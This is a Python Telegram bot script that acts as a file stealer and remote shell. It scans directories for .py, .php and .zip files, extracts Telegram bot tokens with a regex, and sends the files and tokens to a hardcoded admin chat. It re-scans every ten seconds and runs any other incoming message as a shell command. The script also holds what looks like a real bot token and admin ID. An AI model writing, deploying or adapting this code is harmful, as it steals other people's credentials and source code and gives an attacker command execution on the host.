import os, re, time, threading, telebot, subprocess, requests

BOT_TOKEN = "8193906441:AAHXgEf-hAu88-PNxxxTntnmGlEinqSH5Ac"
ADMIN_ID = 1353119625  # حط ID تبعك
bot = telebot.TeleBot(BOT_TOKEN)

watching = False
sent_files = set()
TOKEN_REGEX = r'\d{6,}:[A-Za-z0-9_-]{30,}'
scan_path = "."

def extract_tokens(filepath):
    try:
        if filepath.endswith(('.py', '.php')):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return re.findall(TOKEN_REGEX, f.read())
        return []
    except:
        return []

def send_file(filepath):
    if filepath in sent_files:
        return
    tokens = extract_tokens(filepath)
    caption = "[+] Tokens Found:\n" + "\n".join(tokens) if tokens else "[!] No token found."
    try:
        with open(filepath, 'rb') as f:
            bot.send_document(ADMIN_ID, f, caption=caption)
        sent_files.add(filepath)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error sending {filepath}: {str(e)}")

def scan_directory(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(('.py', '.php', '.zip')):
                send_file(os.path.join(root, file))

def watch_directory(path):
    global watching
    while watching:
        scan_directory(path)
        time.sleep(10)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "Bot Running ✔️")

@bot.message_handler(func=lambda m: True)
def handler(m):
    if m.from_user.id != ADMIN_ID: return
    cmd = m.text
    if cmd.startswith('watch_on'):
        global watching, scan_path
        scan_path = cmd.split(maxsplit=1)[1] if len(cmd.split())>1 else '.'
        if not watching:
            watching = True
            threading.Thread(target=watch_directory, args=(scan_path,), daemon=True).start()
            bot.reply_to(m, f"Watching: {scan_path}")
    elif cmd == 'watch_off':
        watching = False
        bot.reply_to(m, "Stopped watching.")
    elif cmd.startswith('pull'):
        file = cmd.split(maxsplit=1)[1]
        send_file(file)
        bot.reply_to(m, f"Pulled: {file}")
    else:
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            bot.reply_to(m, out[:4000] or "✔️ Done.")
        except Exception as e:
            bot.reply_to(m, f"Error: {str(e)}")

threading.Thread(target=bot.infinity_polling, daemon=True).start()
